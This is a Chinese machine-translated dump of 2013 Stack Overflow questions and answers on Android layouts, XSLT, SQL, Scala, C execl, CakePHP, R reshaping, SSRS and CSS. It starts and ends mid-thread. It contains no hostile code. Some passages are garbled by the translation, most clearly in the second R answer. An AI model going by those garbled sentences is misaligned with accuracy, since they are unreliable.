04-14 16:11:55.232: E/AndroidRuntime(24014):    at java.lang.reflect.Method.invokeNative(Native Method)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at java.lang.reflect.Method.invoke(Method.java:511)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1006)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:773)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at dalvik.system.NativeStart.main(Native Method)
04-14 16:11:55.232: E/AndroidRuntime(24014): Caused by: java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.view.ViewGroup.addViewInner(ViewGroup.java:3618)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.view.ViewGroup.addView(ViewGroup.java:3489)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.widget.TableLayout.addView(TableLayout.java:425)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.view.ViewGroup.addView(ViewGroup.java:3434)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.widget.TableLayout.addView(TableLayout.java:407)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.view.ViewGroup.addView(ViewGroup.java:3410)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.widget.TableLayout.addView(TableLayout.java:398)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at org.opencv.samples.fd.StatsActivity.doStats(StatsActivity.java:202)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at org.opencv.samples.fd.StatsActivity.onCreate(StatsActivity.java:64)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.Activity.performCreate(Activity.java:5206)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1083)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2064) 
```

这是代码片段：

```
public void doStats()
{       
    TableLayout table = (TableLayout) StatsActivity.this.findViewById(R.id.TableLayout01);

    String[] pattern =  splitPattern();         
    for (int i = 0; i < pattern.length; i++)
    {       

        // create a new TableRow
        TableRow row = (TableRow) LayoutInflater.from(StatsActivity.this).inflate(R.layout.attrib_row, null);

        String[] sessions = pattern[i].split("/");

        for (int y = 0; y < sessions.length; y++)
        {
            ((TextView)row.findViewById(R.id.TextView01)).setText(String.valueOf(sessions[0].toString()));
            ((TextView)row.findViewById(R.id.TextView02)).setText(String.valueOf(sessions[1].toString()));
            table.addView(row);             
        }                       
    }
    table.requestLayout(); 
} 
```

请注意，目前我正在`doStats()`从`onCreate`. 任何内部将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:00:29.447

移出`table.addView(row)`内循环。

# xml - XML 不使用 XSL 显示

> ID：15998265
> 
> 赞同：1
> 
> 时间：2013-04-14T10:54:42.777
> 
> 标签：xml, xslt

加载 XML 文件时没有数据显示。似乎没有使用 XSL 文件，我只是得到一个空白屏幕。请有人看看，看看它为什么会这样做。提前致谢。

这是我的代码：

XML:

```
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="computers.xsl"?>
<!DOCTYPE computers SYSTEM "computers.dtd">
<computers>
    <computer>
    <cpu ghz="3.5" unlocked="Yes">Intel i7 3770k</cpu>
    <motherboard>MSI M-Power</motherboard>
    <ram>8</ram>
    <storage>
        <hdd>1000</hdd>
        <ssd>128</ssd>
    </storage>
    <gpu group="ATI">7950</gpu>
    <psu>750</psu>
</computer>
<computer>
    <cpu ghz="3.5" unlocked="Yes">Intel i5 3570k</cpu>
    <motherboard>ASRock Extreme 4</motherboard>
    <ram>8</ram>
    <storage>
        <hdd>1000</hdd>
    </storage>
    <gpu group="ATI">7870</gpu>
    <psu>600</psu>
</computer>
<computer>
    <cpu ghz="3.5" unlocked="No">Intel i5 3550</cpu>
    <motherboard>ASRock Extreme 3</motherboard>
    <ram>8</ram>
    <storage>
        <hdd>500</hdd>
    </storage>
    <gpu group="GeForce">9600GT</gpu>
    <psu>500</psu>
</computer>
 </computers> 
```

DTD：

```
<!ELEMENT computer (cpu,motherboard,ram,storage,gpu,psu) >
<!ELEMENT cpu (#PCDATA)>
<!ELEMENT motherboard (#PCDATA)>
<!ELEMENT ram (#PCDATA)>
<!ELEMENT storage(hdd,ssd*)>
<!ELEMENT hdd (#PCDATA)>
<!ELEMENT ssd (#PCDATA)>
<!ELEMENT gpu (#PCDATA)>
<!ELEMENT psu (#PCDATA)>

<!ATLIST cpu
ghz CDATA #REQUIRED
unlocked (Yes|No) "No">
<!ATLIST gpu
group (ATI|GeForce) "ATI"> 
```

XSL：

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<head>
    <title>HELLO WORLD</title>
</head>
<body>
    <xsl:for-each select="computers/computer">
        <table border="1">
            <tr>
                <td>
                    <xsl:value-of select="cpu"/>
                </td>
                <td>
                    <xsl:value-of select="cpu/@ghz"/>
                </td>
                <td>
                    <xsl:value-of select="cpu/@unlocked"/>
                </td>
            </tr>
            <tr>
                <td>
                    <xsl:value-of select="motherboard"/>
                </td>
            </tr>
            <tr>
                <td>
                    <xsl:value-of select="ram"/>
                </td>
            </tr>
            <tr>
                <td>
                    <xsl:for-each select="storage"/>
                        <xsl:value-of select="hdd"/>
                        <xsl:value-of select="ssd"/>
                    </xsl:for-each>
                </td>
            </tr>
            <tr>
                <td>
                    <xsl:value-of select="gpu"/>
                </td>
            </tr>
            <tr>
                <td>
                    <xsl:value-of select="psu"/>
                </td>
            </tr>
        </table>
    </xsl:for-each>
</body>
</html>
</xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T13:08:54.157

您的 XSLT 格式不正确，您的 XSLT 处理器（我怀疑它是浏览器）可能只是拒绝处理它。您应该从中删除斜线`for-each`：

```
<xsl:for-each select="storage"/> 
```

一旦你这样做了，我相信 XSLT 会成功运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T15:11:16.627

除了 XSLT 样式表格式错误（不是格式良好的 XML）文档外，似乎没有其他问题。

**1\. 替换第 33 行**：

```
 <xsl:for-each select="storage"/> 
```

**和**

```
 <xsl:for-each select="storage"> 
```

**2\. 从源 XML 文档中删除`<!DOCTYPE computers SYSTEM "computers.dtd">`XSLT 转换不使用且不必要的 -- 它。XSLT 转换仅使用来自 DTD 的关于 ID 属性的数据——并且在提供的 DTD 中没有**。

在此替换和删除之后，转换运行没有问题，并且在应用于提供的 XML 文档时：

```
<computers>
    <computer>
        <cpu ghz="3.5" unlocked="Yes">Intel i7 3770k</cpu>
        <motherboard>MSI M-Power</motherboard>
        <ram>8</ram>
        <storage>
            <hdd>1000</hdd>
            <ssd>128</ssd>
        </storage>
        <gpu group="ATI">7950</gpu>
        <psu>750</psu>
    </computer>
    <computer>
        <cpu ghz="3.5" unlocked="Yes">Intel i5 3570k</cpu>
        <motherboard>ASRock Extreme 4</motherboard>
        <ram>8</ram>
        <storage>
            <hdd>1000</hdd>
        </storage>
        <gpu group="ATI">7870</gpu>
        <psu>600</psu>
    </computer>
    <computer>
        <cpu ghz="3.5" unlocked="No">Intel i5 3550</cpu>
        <motherboard>ASRock Extreme 3</motherboard>
        <ram>8</ram>
        <storage>
            <hdd>500</hdd>
        </storage>
        <gpu group="GeForce">9600GT</gpu>
        <psu>500</psu>
    </computer>
</computers> 
```

**产生以下（我猜是想要的）结果**：

```
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

      <title>HELLO WORLD</title>
   </head>
   <body>
      <table border="1">
         <tr>
            <td>Intel i7 3770k</td>
            <td>3.5</td>
            <td>Yes</td>
         </tr>
         <tr>
            <td>MSI M-Power</td>
         </tr>
         <tr>
            <td>8</td>
         </tr>
         <tr>
            <td>1000128</td>
         </tr>
         <tr>
            <td>7950</td>
         </tr>
         <tr>
            <td>750</td>
         </tr>
      </table>
      <table border="1">
         <tr>
            <td>Intel i5 3570k</td>
            <td>3.5</td>
            <td>Yes</td>
         </tr>
         <tr>
            <td>ASRock Extreme 4</td>
         </tr>
         <tr>
            <td>8</td>
         </tr>
         <tr>
            <td>1000</td>
         </tr>
         <tr>
            <td>7870</td>
         </tr>
         <tr>
            <td>600</td>
         </tr>
      </table>
      <table border="1">
         <tr>
            <td>Intel i5 3550</td>
            <td>3.5</td>
            <td>No</td>
         </tr>
         <tr>
            <td>ASRock Extreme 3</td>
         </tr>
         <tr>
            <td>8</td>
         </tr>
         <tr>
            <td>500</td>
         </tr>
         <tr>
            <td>9600GT</td>
         </tr>
         <tr>
            <td>500</td>
         </tr>
      </table>
   </body>
</html> 
```

**所有四种浏览器：IE、FF、Safari 和 Opera 都正确处理了computers.xml 并产生了想要的显示**。

我对 Chrome 没有任何帮助——众所周知，这个浏览器在处理本地文件时会出现问题。

# templates - Play 中所有视图的可重用 Scala 代码

> ID：15998266
> 
> 赞同：4
> 
> 时间：2013-04-14T10:54:44.473
> 
> 标签：templates, playframework, playframework-2.0, reusability

我知道我可以在模板中像这样声明一个可重用的纯 Scala 块：

```
@title(text: String) = @{
  text.split(' ').map(_.capitalize).mkString(" ")
} 
```

我现在可以调用`@title("someString")`模板，但无法从该模板外部访问此代码块。

如何声明这样一个也可以从其他模板访问的块？

我尝试像这样创建一个新模板**title.scala.html**：

```
@(text : String)
@{
    text.split(' ').map(_.capitalize).mkString(" ")
} 
```

我现在可以`@title("someString")`从我想要的任何模板调用，但这并没有给我与模板内的第一个块完全相同的结果（我假设在第一种情况下它返回 a`String`而`Html`在第二种情况下返回）。

我正在使用 Play framework 2.0.4 并且我正在使用 Java 进行编码（因此我的 Scala 知识有限）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T11:28:07.610

Using`tags`旨在构建可重用的 HTML 代码块，因此它返回`Html`

要轻松处理常见类型的数据，您可以轻松添加自定义 Java 类（例如在新创建的`utils`包（在`app`目录中）中的示例，并在其中准备所有必需的格式化程序作为静态方法：

`utils.MyFormats.java:`

```
package utils;

import org.apache.commons.lang3.text.WordUtils;

public class MyFormats {

    public static String capitalize(String str) {
        return WordUtils.capitalize(str);
    }

    public static int sumElements(int a, int b) {
        return a + b;
    }

} 
```

在模板中：

```
<h2>Capitalized each word: @(utils.MyFormats.capitalize("foo bar"))</h2>
<h3>Sum of two integers, 2+3 = @(utils.MyFormats.sumElements(2, 3))</h3> 
```

# c# - 如何获取本地文件的id

> ID：15998268
> 
> 赞同：0
> 
> 时间：2013-04-14T10:54:56.773
> 
> 标签：c#, database, algorithm, sqlite

我有一个数据库表，它使用以下定义保存文件/文件夹结构：

```
id    parentid     fileOrFolderName
111    222          aaa.txt
222    333          folderA
333    Root         folderB
444    222          bbb.doc 
```

............

“根”是预定义根文件夹的特殊 ID。所以，以上记录的意思是：“Rootfolder\folderB\folderA\aaa.txt”中有一个文件，其id为“111”。

现在，给定文件的完整路径，我想获取它的 ID。例如：

GetFileId("RootFolder\folderB\folderA\aaa.txt") 将返回“111”。

该表中大约有 10 到 5 万条记录，如何正确高效地编写 GetFileId 函数？

这个问题不限于任何语言或数据库，我需要的是正确的算法。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:55:13.313

使用这种数据结构，显而易见的算法（每个级别进行一次单独的查找）是唯一有效的算法。

对于目录层次结构中的每个级别，请执行以下操作：

```
SELECT id FROM MyTable WHERE parentid = ? AND fileOrFolderName = ? 
```

您可以将所有查找合并到一个嵌套语句中：

```
SELECT id FROM MyTable
WHERE parentid =
   (SELECT id FROM MyTable
    WHERE parentid =
       (SELECT id FROM MyTable
        WHERE parentid = 'Root'
          AND fileOrFolderName = 'folderB')
      AND fileOrFolderName = 'folderA')
  AND fileOrFolderName = 'aaa.txt' 
```

但是，这不会更快，但会使查询构造更加复杂。

* * *

为了使其更快，请使用适当的索引。（两列上的索引应该会有所帮助。这两列和列上的覆盖`parentid`索引[可能](http://www.sqlite.org/queryplanner.html#covidx)会更好一些。）`fileOrFolderName``id`

# scala - 隐式 <:< 如何帮助查找类型参数

> ID：15998272
> 
> 赞同：22
> 
> 时间：2013-04-14T10:55:17.683
> 
> 标签：scala, implicit

在我阅读 7.3.2 从 Joshua 的 Scala 中深度捕获类型约束时出现了几个问题。摘自书中的例子：

```
scala> def peek[C, A](col: C)(implicit ev: C <:< Traversable[A]) = (col.head, col)
peek: [C, A](col: C)(implicit ev: <:<[C,Traversable[A]])(A, C)

scala> peek(List(1, 2, 3))
res9: (Int, List[Int]) = (1,List(1, 2, 3)) 
```

第一个参数列表似乎很简单`C`。`List[Int]`书中解释了如何`<:<`通过方差强制类型约束。但我不太明白这对查找有什么帮助`A`。

我的理解是，从第一个参数列表中，scala 找出`C: List[Int]`，然后寻找`implicit ev: <:<[List[Int], Traversable[A]]`. 目前`A`仍是未知数。它“拉”了两个隐式`conforms[List[Int]]`和`conforms[Traversable[A]]`匹配`ev`。在任何一种情况下，为了满足方差，`List[Int] <: Traversable[A]`都必须满足，这导致发现`A`是`Int`。

它像我在这里描述的那样工作吗？特别是关于如何/何时`A`推断。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-11T00:17:12.230

正如[pedrofurla 评论](https://stackoverflow.com/questions/15998272/how-does-implicit-help-to-find-type-parameters#comment22815250_15998272)的那样，你做对了——有一点资格。你说编译器“拉” `conforms[Traversable[A]]`，但这里真的不需要任何这样的例子。举一个简化的例子，它非常清楚范围内的隐含：

```
trait Foo[-From, +To]

implicit object intListFoo extends Foo[List[Int], List[Int]] 
```

现在肯定没有`Foo[Traversable[Int], Traversable[Int]]`了，但我们*可以*写如下：

```
scala> implicitly[Foo[List[Int], Traversable[Int]]]
res0: Foo[List[Int],Traversable[Int]] = intListFoo$@8e760f2 
```

在您的示例中或多或少发生了完全相同的事情。在这种情况下，如果我们需要它，我们会在周围有一个实例`Traversable[Int] <:< Traversable[Int]`，但我们不需要那个特定的隐式搜索。

# java - 如何在 Java 中可视化二维向量数组

> ID：15998280
> 
> 赞同：0
> 
> 时间：2013-04-14T10:56:22.407
> 
> 标签：java, visualization, data-visualization, vectorization

我有一个二维数组，其中每个元素都是一个固定长度的向量。我正在使用 Java，需要以颜色矩阵的形式可视化 2D 数组（如在 Matlab 中）。我想可视化二维数组中的向量如何随时间变化（例如：在循环 0...100 中可视化）。

我需要以下帮助。

1.  表示二维数组的每个元素的最佳值是多少？（我使用了规范，但我想确认这是否是向量的标准估计）
2.  可视化上述二维数组的最佳方法是什么？（我想用 Swing 编写自己的可视化。还有其他方法可以节省时间吗？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:01:43.947

怎么样 int [ ] [ ] matrix = new int [ 100 ] [ 100 ] 要可视化它，您可以简单地打印它：

`for (int i=0; i<rows; i++) {` `for (int j=0;j<cols;j++) {` `System.out.println( matrix[i][j]+" ");` `}` `System.out.println();` `}`

# c - 如何在c中使用execl命令创建文件

> ID：15998283
> 
> 赞同：1
> 
> 时间：2013-04-14T10:56:30.707
> 
> 标签：c, unix, process, os.execl

```
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#define MAXLINIE 100

main(int argc, char* argv[]) {
    if (fork()==0){

        execl("/bin/> temporar.txt", "/bin/> temporar.txt", ">temporar.txt", NULL);

    }
} 
```

基本上，我想做的是使用 unix 中的进程创建一个文件，这是我的代码，但由于某种原因它不起作用，我不太了解该`execl`命令以及为什么前两个参数必须相同:`execl("/bin/ls", "/bin/ls", "-l", NULL);`这很好用，有人可以帮帮我吗？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T10:57:57.220

考虑使用 system() 代替：

```
system("/bin/ls -l > temporar.txt"); 
```

或使用 execl 调用`/bin/sh`重定向流：

```
execl("/bin/sh", "/bin/sh", "-c" , "/bin/ls -l >temporar.txt", NULL); 
```

execl 的第一个参数是要执行的命令，第二个是要传递给命令的第一个参数 (argv[0])，第三个和下一个 - 其他参数 argv[1] ...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:03:07.940

首先搜索[whereis](http://linux.about.com/library/cmd/blcmdl1_whereis.htm)是[touch](http://en.wikipedia.org/wiki/Touch_%28Unix%29)：

```
~$ whereis touch
touch: /bin/touch /usr/bin/touch /usr/bin/X11/touch 
```

使用：[int execl(const char *path, const char *arg, ...);](http://man.yolinux.com/cgi-bin/man2html?cgi_command=execv)

```
execl("/bin/touch", "touch", "filename", NULL);
          ^            ^         ^         ^
       command       command   argument    
        path           name
                     arg 0     arg 1 
```

# php - cakephp 用户之间的友谊 将模型链接在一起

> ID：15998284
> 
> 赞同：-1
> 
> 时间：2013-04-14T10:56:43.080
> 
> 标签：php, mysql, cakephp-2.1, cakephp-model

**我需要的：**

类似facebook的友谊系统。

1.  `User (A)`发送好友请求`User (B)`
2.  `User (B)`确认请求
3.  `User (A)`现在`User (B)`是朋友

**我的问题：**

我很困惑如何解决这个问题。我在互联网上阅读了很多，但它并没有真正帮助我......

**我的问题：**

*   CakePHP 中的链接是什么样的？是 hasAndBelongsToMany 吗？还是有很多？或者 ...？
*   我如何正确地在数据库中实现它？
*   如何在模型中链接它？

**我已经做了什么：**

桌子：`users`

名称：`id`, `username`, `password`, ...

users_users 表：`id`, `user_id`, `friend_id`,`approved`

模型：

```
'User' => array(
                'className' => 'User',
                'joinTable' => 'users_users',
                'foreignKey' => 'user_id',
                'associationForeignKey' => 'friend_id',
                'unique' => 'keepExisting',
                'conditions' => '',
                'fields' => '',
                'order' => '',
                'limit' => '',
                'offset' => '',
                'finderQuery' => '',
                'deleteQuery' => '',
                'insertQuery' => ''
                ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T08:02:28.963

“@tereško 谢谢！但我收到一个错误：错误：发生内部错误”

首先回答您对您得到的“内部错误”的评论：

尝试设置`debug`为 2，`config.php`你会意识到你会开始得到更容易理解的错误。

关于您的第一个问题： 1.您的关系基本上看起来像[hasMAny](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#hasmany)，因为每个用户都有朋友。HABTM 也可以在这里工作，但要复杂得多。这个决定（使用什么关系）还取决于系统的其他部分——即，您希望在系统的其他部分中使用什么以及如何使用这些数据。2\. 阅读[这里](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html) 3.[再阅读那里](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html)

[通过 jon 模型](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#hasmany-through-the-join-model)进一步了解[HABTM](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#hasandbelongstomany-habtm)和hasMany （如果您需要在连接表中存储任何其他数据，同时使用与 HABTM 相同的想法）。

> **当HABTM变得复杂时该怎么办？**
> 
> 默认情况下，当保存 HasAndBelongsToMany 关系时，Cake 会在保存新行之前删除连接表上的所有行。例如，如果您有一个关联了 10 个孩子的俱乐部。然后，您使用 2 个孩子更新 Club。俱乐部将只有 2 个孩子，而不是 12 个。另请注意，如果您想向联接添加更多字段（创建时或元信息），这可以使用 HABTM 联接表，但重要的是要了解您有一个简单的选择。两个模型之间的 HasAndBelongsToMany 实际上是通过 hasMany 和 belongsTo 关联关联的三个模型的简写。

您当前的数据库结构很糟糕。我不明白为什么你需要一个名为的表`table`- 或者我弄错了。如果你打算使用 HABTM，你根本不需要创建连接模型 - cake 会自动为你创建和填充它。

有关 HATBM 的更多信息：

1.  [这里](https://stackoverflow.com/questions/10484778/cakephp-habtm-record-wont-delete-with-unique-set-to-true/10511895#10511895)
2.  [那里](https://stackoverflow.com/questions/10428233/cakephp-2-1-saving-habtm-fields/10447063#10447063)
3.  [这里](https://stackoverflow.com/questions/10429812/cakephp-saving-data-in-habtm-fields/10431118#10431118)
4.  [那里](https://stackoverflow.com/questions/5795615/saving-habtm-with-extra-fields/10348655#10348655)

# r - R统计中的简单数据透视表类型转换

> ID：15998287
> 
> 赞同：3
> 
> 时间：2013-04-14T10:57:35.653
> 
> 标签：r

我已经尝试学习 R 有一段时间了，但我的知识还没有达到一个不错的水平。我最终会到达那里，但我现在处于紧要关头，想知道你是否可以帮我做一个快速的“转换”类型的作品。

我有一个包含 1800 万行的 csv 数据文件，其中包含以下数据字段：人员 ID、日期和值。它基本上来自一个模拟模型，正在模拟一个人对其储蓄账户的贡献，例如：

```
1,28/02/2013,19.49
2,13/03/2013,16.68
3,15/03/2013,20.34
2,10/01/2014,28.43
3,12/06/2014,38.13
1,29/08/2014,68.46
1,20/12/2013,20.51 
```

因此，如您所见，数据中可以有多个 ID，但每个人的每个日期和贡献金额都是唯一的。

我想改变这个，所以我有每个人每年的贡献历史。因此，例如上面将变为：

```
ID,2013,2014
1,40.00,68.46
2,16.68,28.43
3,20.34,38.13 
```

我有一个粗略的想法，我可以如何解决这个问题：创建另一列仅包含年份的数据，然后按 ID 和年份进行汇总，以将适合每个 ID/年份桶的所有贡献相加。我只是不知道如何开始将其翻译成 R 脚本。

任何指针/指导将不胜感激。

非常感谢和亲切的问候。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-14T11:39:41.753

这里有几种可能性：

**zoo包** `read.zoo`中的[zoo包](http://cran.r-project.org/package=zoo)可以产生一个多变量时间序列，每个系列一列，即每个ID一列。我们定义`yr`从索引列中获取年份，然后在`split=`我们读入时使用参数拆分 ID。我们用于`aggregate=sum`聚合剩余的列——这里只有一个。我们使用 text = Lines 来保持下面的代码自包含，但如果使用真实文件，我们会用 . 替换它`"myfile"`。最后一行转置了结果。如果可以将人员放在列而不是行中，我们可以删除该行。

```
Lines <- "1,28/02/2013,19.49
2,13/03/2013,16.68
3,15/03/2013,20.34
2,10/01/2014,28.43
3,12/06/2014,38.13
1,29/08/2014,68.46
1,20/12/2013,20.51
"
library(zoo)

# given a Date string, x, output the year
yr <- function(x) floor(as.numeric(as.yearmon(x, "%d/%m/%Y")))

# read in data, reshape & aggregate
z <- read.zoo(text = Lines, sep = ",", index = 2, FUN = yr,  
   aggregate = sum, split = 1)     

# transpose (optional)  
tz <- data.frame(ID = colnames(z), t(z), check.names = FALSE) 
```

通过发布的数据，我们得到以下结果：

```
> tz
  ID  2013  2014
1  1 40.00 68.46
2  2 16.68 28.43
3  3 20.34 38.13 
```

参见`?read.zoo`和`zoo-read`小插图。

**reshape2 包**这是使用 reshape2 包的第二种解决方案：

```
library(reshape2)

# read in and fix up column names and Year

DF <- read.table(text = Lines, sep = ",") ##
colnames(DF) <- c("ID", "Year", "Value") ##
DF$Year <- sub(".*/", "", DF$Year) ##

dcast(DF, ID ~ Year, fun.aggregate = sum, value.var = "Value") 
```

结果是：

```
 ID  2013  2014
1  1 40.00 68.46
2  2 16.68 28.43
3  3 20.34 38.13 
```

**reshape function**这是一个不使用任何插件包的解决方案。首先使用最后一个解决方案中标记为## 的三行读取数据。这将产生`DF`. 然后聚合数据，将其从长形改成宽形，最后修复列名：

```
Ag <- aggregate(Value ~., DF, sum)
res <- reshape(Ag, direction = "wide", idvar = "ID", timevar = "Year")
colnames(res) <- sub("Value.", "", colnames(res)) 
```

产生这个：

```
> res
  ID  2013  2014
1  1 40.00 68.46
2  2 16.68 28.43
3  3 20.34 38.13 
```

**点击功能**。此解决方案也不使用插件包。使用`Ag`上一个解决方案试试这个：

```
tapply(Ag$Value, Ag[1:2], sum) 
```

更新：小改进和 3 个附加解决方案。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T11:25:06.987

您描述的方法是一种合理的方法。可以使用`strptime`and `strftime`( _ _ _ _一：`as.POSIXct``year``data.table``by``ddply`

```
library(plyr)
ddply(df, .(ID, year), summarise, total_per_year = sum(value)) 
```

这假定您的基准日期在 中`df`，并且您的数据中的列称为`year`,`ID`和`value`。请注意，对于大型数据集`ddply`可能会变得非常慢。如果你真的需要原始性能，你肯定想开始使用`data.table`.

# drupal-7 - 如何在 Drupal 7 中制作多个 Nivo Slider 实例

> ID：15998291
> 
> 赞同：1
> 
> 时间：2013-04-14T10:58:08.397
> 
> 标签：drupal-7, nivo-slider

我使用 Drupal 7 开发了一个网站。我使用 Nivo Slider，它非常适合我。我使用 Nivo Slider 作为网站的首页。当我配置 Nivo Slider 时，它的设置显示在 Drupal CMS 菜单的结构下。基本上，我必须更新图像并设置过渡等。

我有另一个页面需要添加新的幻灯片，但我不知道如何制作另一个 Nivo Slider 实例并使用它。我想应该有一个简单的方法来处理这个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T17:14:18.760

[您可以使用MultiBlock](http://drupal.org/project/multiblock)模块创建 nivo 滑块块的另一个实例，但另一个实例将具有与原始滑块块相同的设置和相同的图像。

您可以使用[Views Nivo Slider](http://drupal.org/project/views_nivo_slider)模块来创建另一个滑块块。

# reporting-services - 如何在 SSRS 2012 中将单行旋转到键值表？

> ID：15998293
> 
> 赞同：0
> 
> 时间：2013-04-14T10:58:22.890
> 
> 标签：reporting-services, ssrs-2012

将 SSRS 2012 与 SQL Server 2012 一起使用。我在 SQL Server 2012 中有一个结果集，其中包含以下字段作为标题：

```
sumDeposits,
sumWithdrawals,
sumFees,
etc 
```

这已映射到 SSRS 中的数据集。

我想要一个 SSRS 表或矩阵，其中我可以将列标题作为第一列，将数据行（结果集中只有一行）作为表中的第二列。这可能吗？一直在为此苦苦挣扎。

我应该补充一点，我现在的做法是将一个字段从数据集中拖到 SSRS 页面上，然后在它旁边放一个文本框。字段的数量正在增长，所以我宁愿有一张桌子。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:04:39.573

听起来您想*将*数据从列中转为行。如果是这种情况，那么您应该能够在 SQL中使用[UNPIVOT函数。](http://msdn.microsoft.com/en-us/library/ms177410%28v=sql.105%29.aspx)

查询的基本结构将是：

```
select col, value
from yourtable
unpivot
(
  value
  for col in (sumDeposits, sumWithdrawals, sumFees) -- your columns here
)unpiv; 
```

如果您有不同数据类型的数据，则必须将所有列的数据转换为相同类型：

```
select col, value
from 
(
  select sumDeposits, 
    cast(sumWithdrawals as numeric(10, 2)) sumWithdrawals, 
    sumFees
  from yourtable
) d
unpivot
(
  value
  for col in (sumDeposits, sumWithdrawals, sumFees)
) unpiv; 
```

这种类型的查询与使用 a`UNION ALL`对同一个表的多次调用完全相同：

```
select 'sumDeposits' col, sumDeposits as value
from yourtable
union all
select 'sumWithdrawals' col, sumWithdrawals as value
from yourtable
union all
select 'sumFees' col, sumFees as value
from yourtable 
```

# c++ - O_DIRECT 与 AIO_RAW

> ID：15998294
> 
> 赞同：2
> 
> 时间：2013-04-14T10:58:32.440
> 
> 标签：c++, file, asynchronous, posix, device

使用 POSIX 异步 I/O 时，使用`O_DIRECT`和之间有什么区别`AIO_RAW`吗？或者我应该/我可以同时使用两者吗？我们正在开发一个 NoSQL 数据库服务器，并且正在寻找在 POSIX 系统上提高异步 I/O 效率的方法。

[打开（2）](http://linux.die.net/man/2/open)：

> **O_DIRECT**尽量减少进出该文件的 I/O 的缓存影响。一般来说，这会降低性能，但在特殊情况下很有用，例如当应用程序进行自己的缓存时。文件 I/O 直接与用户空间缓冲区进行。

[aiocb(5)](http://uw714doc.sco.com/en/man/html.5/aiocb.5.html)：

> 当对原始设备分区执行异步 I/O 时，您可以在 aio_flags 结构成员中设置**AIO_RAW**标志位。当设置**AIO_RAW**标志位时，异步 I/O 可能更有效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-02-13T17:48:38.043

提问者从未指定他们支持哪些操作系统（一个链接指向 Linux 手册页，另一个链接指向 SCO 手册页），因此很难在没有猜测的情况下回答这个问题。

在撰写本文时，Linux 不支持`AIO_RAW`，因为 glibc`struct aiocb`没有`aio_flags`成员（[https://www.gnu.org/software/libc/manual/html_node/Asynchronous-I_002fO.html](https://www.gnu.org/software/libc/manual/html_node/Asynchronous-I_002fO.html)）和内核 AIO（其中is NOT POSIX) 不支持`AIO_RAW`值。所以：

> 使用 O_DIRECT 和 AIO_RAW 有什么区别吗？或者我应该/我可以同时使用两者吗？

是的，因为并非所有支持 POSIX AIO 的操作系统（例如 Linux）都允许您进行设置`AIO_RAW`，并且在某些情况下您肯定无法同时使用两者。此外，在某些操作系统（例如 Linux）`O_DIRECT`上，可以在文件系统和设备上使用文件，而`AIO_RAW`仅适用于“原始设备”。从 dt 源代码来看，它看起来`AIO_RAW`只在 HP-UX 和 SCO Unix 上受支持，因此它可能在其他操作系统上的使用受到限制。

# css - CSS 表单。请帮助我使用“单选”按钮

> ID：15998296
> 
> 赞同：-3
> 
> 时间：2013-04-14T10:58:42.643
> 
> 标签：css, forms, button, radio

所以......就像你可以看到的（这里：[http](http://www.ulozisko.sk/obrazky/605327/form.jpg) ://www.ulozisko.sk/obrazky/605327/form.jpg ），我的问题是在“收音机”按钮......我想让这个按钮并排。你能帮助我吗？

*****性别：

```
 <input type="radio" name="sex" />Male
    <input type="radio" name="sex" />Female 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:00:21.260

我猜你正在`width`为所有`input`元素设置 a 。您应该排除单选按钮，例如：

```
input[type="radio"] {
    width: auto;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:01:55.897

尝试：

```
<label for="male">Male</label><input type="radio" name="sex" id="male"/>
<label for="female">Female</label><input type="radio" name="sex" id="female"/> 
```

# java - 遍历泛型 List java

> ID：15998297
> 
> 赞同：0
> 
> 时间：2013-04-14T10:58:45.313
> 
> 标签：java

嗨我被困在如何使用迭代器迭代通用列表。

